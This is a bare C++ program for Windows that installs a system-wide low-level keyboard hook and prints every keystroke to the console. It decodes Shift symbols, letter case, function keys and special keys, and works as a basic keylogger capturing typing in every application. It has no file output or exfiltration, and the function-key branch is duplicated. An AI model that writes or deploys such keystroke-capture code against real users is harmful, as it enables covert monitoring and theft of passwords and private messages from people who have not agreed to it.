#include <fstream>
#include <iostream>
#include <Windows.h>
#include <stdio.h>

using namespace std;

bool isCapsLockOn() {

	if ((GetKeyState(VK_CAPITAL) & 0x00001) != 0)
		return true;
	else
		return false;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

	if (wParam == WM_KEYDOWN) {

		if (p->vkCode >= 0x30 && p->vkCode <= 0x39) // 0~9
		{
			switch (p->vkCode) {
				// 0 ~ 9 with Shift Options.
			case 0x30: if (GetAsyncKeyState(VK_SHIFT)) cout << ')';     else cout << '0';        break;
			case 0x31: if (GetAsyncKeyState(VK_SHIFT)) cout << '!';     else cout << '1';        break;
			case 0x32: if (GetAsyncKeyState(VK_SHIFT)) cout << '@';     else cout << '2';        break;
			case 0x33: if (GetAsyncKeyState(VK_SHIFT)) cout << '#';     else cout << '3';        break;
			case 0x34: if (GetAsyncKeyState(VK_SHIFT)) cout << '$';     else cout << '4';        break;
			case 0x35: if (GetAsyncKeyState(VK_SHIFT)) cout << '%';     else cout << '5';        break;
			case 0x36: if (GetAsyncKeyState(VK_SHIFT)) cout << '^';     else cout << '6';        break;
			case 0x37: if (GetAsyncKeyState(VK_SHIFT)) cout << '&';     else cout << '7';        break;
			case 0x38: if (GetAsyncKeyState(VK_SHIFT)) cout << '*';     else cout << '8';        break;
			case 0x39: if (GetAsyncKeyState(VK_SHIFT)) cout << '(';     else cout << '9';        break;
			}
		}

		else if (p->vkCode >= 0x41 && p->vkCode <= 0x5A) // a~z
		{

			if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn())) {
				cout << char(tolower(p->vkCode));

			}
			else

				cout << (char)p->vkCode;

		}

		else if (p->vkCode >= 0x70 && p->vkCode <= 0x7B) // F1 ~ F12.
		{
			cout << "[F" << p->vkCode - 111 << "]";
		}
		else if (p->vkCode >= 0x70 && p->vkCode <= 0x7B) // F1 ~ F12.
		{
			cout << "[F" << p->vkCode - 111 << "]";
		}

		else if (p->vkCode)

		{
			switch (p->vkCode)
			{
			case VK_CAPITAL:    cout << "<CAPLOCK>";        break;
			case VK_LCONTROL:   cout << "<LCTRL>";      break;
			case VK_RCONTROL:   cout << "<RCTRL>";      break;
			case VK_INSERT:     cout << "<INSERT>";     break;
			case VK_END:        cout << "<END>";            break;
			case VK_PRINT:      cout << "<PRINT>";      break;
			case VK_DELETE:     cout << "<DEL>";            break;
			case VK_BACK:       cout << "<BK>";         break;
			case VK_LEFT:       cout << "<LEFT>";       break;
			case VK_RIGHT:      cout << "<RIGHT>";      break;
			case VK_UP:         cout << "<UP>";         break;
			case VK_DOWN:       cout << "<DOWN>";       break;
			case VK_SPACE:      cout << ' ';                break;
			case VK_ESCAPE:     cout << "<ESC>";            break;
			case VK_TAB:        cout << "<TAB>";            break;

			}
		}

	}

	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{

	HHOOK keyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	MSG msg;
	while (!GetMessage(&msg, NULL, NULL, NULL)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(keyBoard);
}